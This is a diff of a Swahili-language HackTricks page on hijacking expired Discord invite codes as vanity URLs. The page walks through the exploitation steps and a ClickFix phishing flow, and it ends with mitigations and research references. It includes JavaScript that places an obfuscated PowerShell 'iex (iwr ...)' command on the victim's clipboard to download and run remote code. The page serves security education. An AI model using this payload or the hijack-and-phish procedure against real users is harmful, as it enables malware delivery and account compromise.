@@ -2,40 +2,40 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Uwezo wa mfumo wa mwaliko wa Discord unaruhusu wahalifu kudai nambari za mwaliko zilizokwisha muda au kufutwa (za muda, za kudumu, au za kibinafsi) kama viungo vipya vya kibinafsi kwenye seva yoyote iliyoimarishwa kiwango cha 3. Kwa kupeleka nambari zote kwa herufi ndogo, washambuliaji wanaweza kujiandikisha mapema nambari za mwaliko zinazojulikana na kwa kimya kuhamasisha trafiki mara nambari ya asili inapokwisha muda au seva ya chanzo inapopoteza nguvu yake.
+Udhaifu wa mfumo wa mialiko wa Discord huwawezesha threat actors kudai invite codes zilizo-expire au kufutwa (za muda, za kudumu, au custom vanity) kama vanity links mpya kwenye server yoyote yenye Level 3 Boost. Kwa kubadilisha codes zote kuwa lowercase, attackers wanaweza kujiandikisha mapema kwa invite codes zinazojulikana na kuteka traffic kwa siri mara link ya awali inapo-expire au source server inapopoteza boost yake.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Aina za Mwaliko na Hatari ya Hijack
+## Invite Types and Hijack Risk
 
-| Aina ya Mwaliko      | Inaweza Kuwa Hijacked? | Masharti / Maoni                                                                                       |
-|-----------------------|-----------------------|-------------------------------------------------------------------------------------------------------|
-| Kiungo cha Mwaliko wa Muda | ✅                    | Baada ya kuisha, nambari inapatikana na inaweza kujiandikisha tena kama URL ya kibinafsi na seva iliyoimarishwa. |
-| Kiungo cha Mwaliko wa Kudumu | ⚠️                    | Ikiwa imefutwa na inajumuisha herufi ndogo tu na nambari, nambari inaweza kupatikana tena.        |
-| Kiungo cha Kibinafsi    | ✅                    | Ikiwa seva ya asili inapoteza nguvu yake ya Kiwango cha 3, mwaliko wake wa kibinafsi unapatikana kwa usajili mpya.    |
+| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
+|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
+| Temporary Invite Link | ✅          | Baada ya ku-expire, code huwa inapatikana na inaweza kujiandikishwa tena kama vanity URL na server yenye boost. |
+| Permanent Invite Link | ⚠️          | Ikiwa itafutwa na inajumuisha lowercase letters na digits pekee, code inaweza kupatikana tena.        |
+| Custom Vanity Link    | ✅          | Ikiwa server ya awali itapoteza Level 3 Boost yake, vanity invite yake huwa inapatikana kwa usajili mpya.    |
 
-## Hatua za Kutumia
+## Exploitation Steps
 
-1. Upelelezi
-- Fuata vyanzo vya umma (mifumo, mitandao ya kijamii, vituo vya Telegram) kwa viungo vya mwaliko vinavyolingana na muundo `discord.gg/{code}` au `discord.com/invite/{code}`.
-- Kusanya nambari za mwaliko zinazovutia (za muda au za kibinafsi).
-2. Usajili wa Mapema
-- Unda au tumia seva ya Discord iliyopo yenye haki za Kiwango cha 3.
-- Katika **Mipangilio ya Seva → URL ya Kibinafsi**, jaribu kupeana nambari ya mwaliko wa lengo. Ikiwa inakubaliwa, nambari hiyo inahifadhiwa na seva mbaya.
-3. Kuanzisha Hijack
-- Kwa mwaliko wa muda, subiri hadi mwaliko wa asili uishe (au uifute kwa mikono ikiwa unadhibiti chanzo).
-- Kwa nambari zinazojumuisha herufi kubwa, toleo la herufi ndogo linaweza kudaiwa mara moja, ingawa uelekezaji unaanza tu baada ya kuisha.
-4. Uelekezaji wa Kimya
-- Watumiaji wanaotembelea kiungo cha zamani wanapelekwa kwa urahisi kwenye seva inayodhibitiwa na mshambuliaji mara tu hijack inapoanza.
+1. Reconnaissance
+- Fuatilia vyanzo vya umma (forums, social media, Telegram channels) kwa invite links zinazolingana na pattern ya `discord.gg/{code}` au `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
+- Kusanya invite codes zinazovutia (za muda au vanity).
+2. Pre-registration
+- Unda au tumia Discord server iliyopo yenye privileges za Level 3 Boost.
+- Kwenye **Server Settings → Vanity URL**, jaribu kuweka target invite code. Ikikubaliwa, code itahifadhiwa na malicious server.
+3. Hijack Activation
+- Kwa temporary invites, subiri hadi invite ya awali i-expire (au ifute mwenyewe ikiwa unadhibiti source).
+- Kwa codes zenye uppercase, lowercase variant inaweza kudaiwa mara moja, ingawa redirection huanza kufanya kazi baada ya expiration.
+4. Silent Redirection
+- Users wanaotembelea link ya zamani watatumwa bila kutambua kwenye server inayodhibitiwa na attacker mara hijack inapoanza kufanya kazi.
 
-## Mchakato wa Phishing kupitia Seva ya Discord
+## Phishing Flow via Discord Server
 
-1. Punguza vituo vya seva ili tu kituo cha **#verify** kiwe visible.
-2. Tumia bot (mfano, **Safeguard#0786**) kuwasihi wapya kuthibitisha kupitia OAuth2.
-3. Bot inaelekeza watumiaji kwenye tovuti ya phishing (mfano, `captchaguard.me`) chini ya kivuli cha hatua ya CAPTCHA au uthibitisho.
-4. Tekeleza hila ya UX ya **ClickFix**:
-- Onyesha ujumbe wa CAPTCHA ulioharibika.
-- Waongoze watumiaji kufungua mazungumzo ya **Win+R**, kubandika amri ya PowerShell iliyopakiwa mapema, na kubonyeza Enter.
+1. Zuia server channels ili **#verify** channel pekee ionekane.<sup>[[1]](#references)</sup>
+2. Deploy bot (kwa mfano, **Safeguard#0786**) ili kuwaomba newcomers wajithibitishe kupitia OAuth2.
+3. Bot huwarudisha users kwenye phishing site (kwa mfano, `captchaguard.me`) kwa kisingizio cha CAPTCHA au hatua ya verification.
+4. Tekeleza ujanja wa UX wa **ClickFix**:
+- Onyesha ujumbe wa CAPTCHA iliyoharibika.
+- Waelekeze users wafungue **Win+R** dialog, wapaste PowerShell command iliyopakiwa mapema, kisha wabonyeze Enter.
 
-### Mfano wa Uingizaji wa ClickFix Clipboard
+### ClickFix Clipboard Injection Example
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -44,18 +44,18 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-Hii mbinu inakwepa upakuaji wa moja kwa moja wa faili na inatumia vipengele vya UI vinavyofahamika ili kupunguza mashaka ya mtumiaji.
+Mbinu hii huepuka upakuaji wa faili moja kwa moja na hutumia vipengele vya UI vinavyojulikana ili kupunguza mashaka ya mtumiaji.<sup>[[1]](#references)</sup>
 
-## Mitigations
+## Hatua za Kupunguza Hatari
 
-- Tumia viungo vya mwaliko vya kudumu vinavyokuwa na angalau herufi moja kubwa au alama zisizo za nambari (hazitakoma, hazitumiwi tena).
-- Badilisha mara kwa mara misimbo ya mwaliko na kufuta viungo vya zamani.
-- Fuata hali ya kuimarisha seva ya Discord na madai ya URL ya vanity.
-- Wafundishe watumiaji kuthibitisha uhalali wa seva na kuepuka kutekeleza amri zilizopachikwa kwenye clipboard.
+- Tumia invite links za kudumu zilizo na angalau herufi moja kubwa au character isiyo ya alphanumeric (haziishi muda wake na haziwezi kutumika tena).<sup>[[1]](#references)</sup>
+- Badilisha invite codes mara kwa mara na ubatilishe links za zamani.
+- Fuatilia hali ya Discord server boost na madai ya vanity URL.
+- Waelimishe watumiaji kuthibitisha uhalisi wa server na kuepuka kutekeleza commands zilizopaste kutoka kwenye clipboard.
 
-## References
+## Marejeleo
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
+- [1] [Kutoka Imani hadi Tishio: Discord Invites Zilizotekwa Zikitumiwa kwa Usambazaji wa Malware wa Hatua Nyingi](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
